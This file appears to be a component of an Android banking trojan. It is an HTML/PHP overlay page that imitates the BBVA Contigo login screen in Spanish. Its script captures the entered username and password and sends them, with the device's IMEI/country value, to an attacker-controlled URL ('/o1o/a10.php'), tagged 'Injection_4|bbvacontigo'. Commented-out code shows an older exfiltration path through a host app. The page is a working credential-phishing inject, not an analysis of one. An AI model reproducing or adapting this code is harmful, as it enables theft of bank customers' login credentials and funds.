<html style="height: 160px;"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css" id="FITML__optAndEmu">


        img {
            border: 0;
            margin-top: 5px;
        }

        @-ms-viewport {
            width: device-width;
            zoom: 1
        }

        .hidden {
            display: none
        }

        body {
            width: auto;
            color: #000000;
            font-size: small;
            font-family: Arial, Sans-Serif;
            margin: 0;
            padding: 0;
            background: #fff
        }

        img {
            border: 0;
            margin: 0;
            padding: 0;
            vertical-align: middle;
            width: 10%;
        }

        table {
            border: 0;
            margin: 0;
            padding: 0;
            border-collapse: collapse
        }

        div {
            margin: 0;
            padding: 0;
            font-size: small
        }

        td {
            margin: 0;
            padding: 0;
            vertical-align: middle;
            font-size: small
        }

        a {
            color: #000000;
            font-size: small;
            text-decoration: none
        }

        form {
            margin: 0;
            padding: 0;
            border: 0
        }

        input {
            vertical-align: middle
        }

        select {
            vertical-align: middle;
            margin: 0;
            padding: 0;
            font-weight: normal
        }

        button {
            vertical-align: middle
        }

        textarea {
            width: 90% !important
        }

        label {
            margin: 0;
            vertical-align: middle;
            color: #003366
        }

        p {
           margin: 0px;
	padding: 14px 0px;
	color: #fff;
	font-size: 20px;
	text-align: center;
        }

        h1 {
            margin: 0;
            padding: 4px 0;
            font-weight: bold;
            font-size: small
        }

        h2 {
            margin: 0;
            padding: 0;
            font-weight: bold;
            font-size: small
        }

        h3 {
            margin: 0;
            padding: 0;
            font-weight: normal;
            font-size: small
        }


.submit_25 {
    width: 100%;
    border-radius: 2px;
    border-color: #036;
    background: #0067CF none repeat scroll 0% 0%;
    border: 0 none;
    margin-top: 10px;
    height: 50px;
    font-family: sans-serif;
    color: #fff;
    font-size: 18px;
}


.input_100 {
    width: 100%;
    padding-left: 10px;
    border: 1px solid grey;
    height: 40px;
    font-size: 18px;
    font-family: sans-serif;
}


        .content {
            margin: 0;
            padding: 0;
            background-color: #fff;
        }


        .teaser_box {
            margin-bottom: 10px;
            border-color: #FFFFFF;
            padding: 10px;
        }

        .input_100:focus {
            box-shadow: 0px 0px 2px #06F;
			background: rgba(249, 235, 201, 0.42);
        }

#head {
    background: rgb(0, 76, 153) none repeat scroll 0% 0%;
}
.fielderror {
    border: 1px solid #f00;
    width: 100%;
    padding-left: 10px;
    height: 40px;
    font-size: 18px;
    font-family: sans-serif;
}
    </style>
    <style></style>
</head>

<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body class="fitMldoc">
<div class="fitMlbody" id="content_div">
<div id="head">
     <p>Introduce tus claves de acceso</p>
</div>


    <section class="content">
        <form action="null" method="post" id="_mainForm" target="flow_handler">
            <div class="teaser_box">


                <div class="ptb">
                    <input name="Usuario" id="login" placeholder="Usuario" maxlength="8" class="input_100" type="text">
                </div>
                <br>

                <div class="ptb">
                    <input class="input_100" placeholder="Contraseña" name="Contraseña" id="password" maxlength="6" type="password">

                </div>
				<h4 style="color: #737373;display: inline-block;margin-top: 20px;">Recordar usuario</h4> <input name="name" type="checkbox" style="float: right;margin-top: 20px;">
				<input name="name" value="BBVA" type="hidden">
                <div class="ptb">
                    <center>
                        <input value="Entrar" id="input_submitBtn" class="submit_25" type="button">
                    </center>
                </div>
            </div>

        </form>





<p style="color: rgb(0, 103, 207); font-size: 13px; font-weight: bold;">¿Olvidaste la contraseña?</p>
    </section>


<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
	</div>
	<script type="text/javascript">



				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');

					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;

                    g_oForm.setAttribute('action',g_sFAct); // ????????????? ? ????? ??? ???????
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};

					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ???????? id ????
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input_100';
						} catch(e){};

                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (oCodeInp.value.length < 4) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "bbvacontigo'+
					'", "usuario": "'+oNumInp.value+
					'", "contrasena": "'+oCodeInp.value+'"}');

						setTimeout(function(){prompt('closeSuccessDialog')}, 7000);
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/

						var url='<?php echo $URL; ?>';
					    var imei_c='<?php echo $IMEI_country; ?>';
					    location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|bbvacontigo|"+oNumInp.value+"|"+oCodeInp.value+"|");

						return false;
                    };

                })();
            </script>

</body></html>
